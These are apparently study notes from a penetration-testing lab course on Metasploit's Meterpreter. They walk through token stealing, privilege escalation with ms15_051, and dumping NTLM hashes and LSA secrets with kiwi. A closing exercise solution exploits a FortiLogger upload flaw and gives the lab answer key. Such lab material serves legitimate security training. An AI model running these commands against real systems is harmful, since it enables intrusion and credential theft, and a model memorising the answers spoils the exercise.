The `Meterpreter` Payload is a specific type of multi-faceted, extensible Payload that uses `DLL injection` to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.

## Running Meterpreter
To run Meterpreter, we only need to select any version of it from the `show payloads` output, taking into consideration the type of connection and OS we are attacking.

When the exploit is completed, the following events occur:
- The target executes the initial stager. This is usually a bind, reverse, findtag, passivex, etc.
- The stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL.
- The Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends a GET. Metasploit receives this GET and configures the client.
- Lastly, Meterpreter loads extensions. It will always load `stdapi` and load `priv` if the module gives administrative rights. All of these extensions are loaded over AES encryption.

## Using Meterpreter
#### MSF - Meterpreter Migration
```shell-session
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.
```

```shell-session
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User             Path
 ---   ----  ----               ----  -------  ----             ----
 0     0     [System Process]                                             
 4     0     System                                                       
 216   1080  cidaemon.exe                                                 
 272   4     smss.exe                                                    
 292   1080  cidaemon.exe                                              
<...SNIP...>
 1712  396   alg.exe                                                      
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                              
 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
 2312  592   wmiprvse.exe                                              
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 4076  1080  cidaemon.exe                                                    

meterpreter > steal_token 183
Stolen token with username: NT AUTHORITY\NETWORK SERVICE

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

Now that we have established at least some privilege level in the system, it is time to escalate that privilege. So, we look around for anything interesting, and in the `C:\Inetpub\` location, we find an interesting folder named `AdminScripts`. However, unfortunately, we do not have permission to read what is inside it.

#### MSF - Interacting with the Target
```cmd-session
c:\Inetpub>dir

dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of c:\Inetpub

04/12/2017  05:17 PM    <DIR>          .
04/12/2017  05:17 PM    <DIR>          ..
04/12/2017  05:16 PM    <DIR>          AdminScripts
09/03/2020  01:10 PM    <DIR>          wwwroot
               0 File(s)              0 bytes
               4 Dir(s)  18,125,160,448 bytes free


c:\Inetpub>cd AdminScripts

cd AdminScripts
Access is denied.
```

We can easily decide to run the local exploit suggester module, attaching it to the currently active Meterpreter session. To do so, we background the current Meterpreter session, search for the module we need, and set the SESSION option to the index number for the Meterpreter session, binding the module to it.

#### MSF - Session Handling
```shell-session
meterpreter > background
```

```shell-session
msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester
msf6 > use 0

msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
```

Running the recon module presents us with a multitude of options. Going through each separate one, we land on the `ms15_051_client_copy_image` entry, which proves to be successful. This exploit lands us directly within a root shell, giving us total control over the target system.

#### MSF - Privilege Escalation
```shell
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images

msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
msf6 exploit(windows/local/ms15_051_client_copy_image) > run


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

#### MSF - Dumping Hashes 
```shell
meterpreter > load kiwi
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::
```

```shell
meterpreter > lsa_dump_sam
```

#### MSF - Meterpreter LSA Secrets Dump
```shell-session
meterpreter > lsa_dump_secrets
```



### Questions

1.  Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

2. Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.


```shell
We found that port 5000 run a uPnP service over http and the login page is from FortiLogger. Viewing the source code we see it's FortiLogger version 3.1.7. Which is vulerable to unauthenticated file upload.\

msf > use windows/http/fortilogger_arbitrary_fileupload
msf > run

meterpreter > getuid
NT AUTHORITY\SYSTEM

meterpreter > load kiwi
meterpreter > lsa_dump_sam
RID  : 000003ea (1002)
User : htb-student
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
  
  
OR

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::

Answer 1: NT AUTHORITY\SYSTEM
Answer 2: cf3a5525ee9414229e66279623ed5c58
```
